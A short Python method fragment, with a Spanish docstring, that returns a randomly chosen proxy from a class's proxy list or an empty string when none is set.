    def _get_random_proxy(self) -> str:
        """Obtiene un proxy aleatorio."""
        return random.choice(self.proxies) if self.proxies else ''
